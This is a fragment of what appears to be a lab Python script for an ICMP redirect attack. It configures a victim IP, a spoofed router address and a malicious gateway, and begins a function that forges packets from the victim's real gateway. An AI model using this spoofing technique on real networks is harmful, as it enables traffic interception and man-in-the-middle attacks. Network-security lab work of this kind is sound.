...
# CONFIGURATION
VICTIM_IP = "10.9.0.5"
FAKE_ROUTER_IP = "10.9.0.11"       # Must match the victim's actual gateway IP!
MALICIOUS_GATEWAY_IP = "10.9.0.111"
TARGET_NETWORK = "192.168.60.0/24"
IFACE = "eth0"

def send_icmp_redirect():
    # 1. Use the victim's REAL GATEWAY IP as the source (critical!)
    ...
    inner_ip = IP(src=VICTIM_IP, dst="192.168.60.0/24")  # e.g., router in the target net
